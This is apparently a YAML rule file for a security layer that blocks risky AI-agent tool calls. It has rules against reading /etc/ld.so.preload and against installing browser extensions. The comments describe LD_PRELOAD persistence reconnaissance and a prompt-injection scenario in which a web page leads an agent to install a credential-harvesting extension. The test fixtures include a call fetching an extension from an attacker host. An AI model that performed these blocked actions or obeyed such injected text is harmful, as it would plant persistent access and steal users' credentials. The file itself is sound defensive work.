rules:
  # === BLOCK: /etc/ld.so.preload read access (LD_PRELOAD persistence recon) (issue #956) ===
  #
  # /etc/ld.so.preload lists shared libraries injected into EVERY process at startup.
  # An AI agent reading this file performs critical reconnaissance for LD_PRELOAD
  # hijacking attacks (MITRE T1574.006):
  #
  #   1. Verify own persistence — an attacker who planted a malicious .so reads
  #      the file back to confirm it persists across reboots
  #   2. Discover security hooks — EDR agents and audit daemons that use LD_PRELOAD
  #      expose themselves here; attacker crafts targeted bypasses
  #   3. Plan library hijacking — understanding the current preload order helps
  #      craft a conflicting entry that shadows a security library
  #
  # Write access is covered by mcp-safety-block-etc-write (blocks all /etc/ writes).
  # This rule blocks the READ side — the reconnaissance step.
  # Analogous to mcp-privesc-block-sudoers-read, which blocks /etc/sudoers reads
  # for the same reason: sensitive security config reveals exploit paths.
  #
  # MITRE T1574.006 — Hijack Execution Flow: LD_PRELOAD
  - id: mcp-persist-block-ld-so-preload-read
    taxonomy: "persistence-evasion/ldpreload-hijacking/ld-preload-injection"
    match:
      tool_name_any:
        - "read_file"
        - "cat_file"
        - "get_file_contents"
        - "open_file"
        - "view_file"
      argument_patterns:
        path: "**/etc/ld.so.preload"
    decision: "BLOCK"
    confidence: 0.92
    reason: "Read access to /etc/ld.so.preload blocked — lists shared libraries injected into every process at startup. Reading this file is a reconnaissance step for LD_PRELOAD persistence attacks: attackers verify their malicious .so is loaded, discover security hooks to bypass, and plan library hijacking. MITRE T1574.006."
    tests:
      tp:
        - tool: "read_file"
          args: {"path": "/etc/ld.so.preload"}
        - tool: "cat_file"
          args: {"path": "/etc/ld.so.preload"}
        - tool: "view_file"
          args: {"path": "/etc/ld.so.preload"}
      tn:
        - tool: "read_file"
          args: {"path": "/project/docs/ld-preload-guide.md"}
        - tool: "read_file"
          args: {"path": "/workspace/project/linker-config-notes.md"}

  # === BLOCK: Browser extension installation via MCP tools (issue #769) ===
  #
  # Browser extensions execute code in the browser process on every session,
  # making this a persistent code execution vector (MITRE T1176). A browser
  # extension installed by a prompt-injected agent persists indefinitely —
  # it survives agent session termination, process restarts, and user logout/login.
  #
  # Attack scenario:
  #   1. Attacker embeds "install extension X" in a web page the agent visits
  #   2. Agent calls install_extension with a malicious CRX/XPI URL
  #   3. Extension runs in every browser session, harvesting cookies and credentials
  #   4. No shell command or file write required — pure MCP tool call
  #
  # Legitimate developer workflows (writing manifest.json, running extension tests)
  # do not require an autonomous agent to call installation tools. Developers
  # install extensions manually through the browser UI.
  #
  # MITRE T1176 — Browser Extensions
  # OWASP LLM06 2025 — Excessive Agency
  - id: mcp-persist-block-browser-extension-install
    taxonomy: "persistence-evasion/agent-config-persistence/browser-extension-install"
    match:
      tool_name_any:
        - "install_extension"
        - "browser_install_extension"
        - "add_browser_extension"
        - "add_extension"
        - "extension_install"
        - "playwright_install_extension"
        - "puppeteer_install_extension"
        - "chrome_install_extension"
        - "firefox_install_extension"
        - "safari_install_extension"
        - "browser_add_extension"
        - "load_extension"
        - "browser_load_extension"
    decision: "BLOCK"
    confidence: 0.95
    reason: "Browser extension installation via MCP tool — extensions execute code in every browser session, creating persistent access that survives agent termination. No legitimate developer workflow requires autonomous extension installation. MITRE T1176, OWASP LLM06."
    tests:
      tp:
        - tool: "install_extension"
          args: {"id": "evil-ext-123"}
        - tool: "browser_install_extension"
          args: {"id": "malicious-extension", "browser": "chrome"}
        - tool: "playwright_install_extension"
          args: {"path": "/tmp/malicious.crx"}
        - tool: "add_extension"
          args: {"url": "https://attacker.com/ext.crx"}
        - tool: "load_extension"
          args: {"path": "/home/user/Downloads/suspicious.xpi"}
      tn:
        - tool: "read_file"
          args: {"path": "/workspace/browser-extension/manifest.json"}
        - tool: "list_extensions"
          args: {}
        - tool: "write_file"
          args: {"path": "/workspace/my-extension/popup.js"}
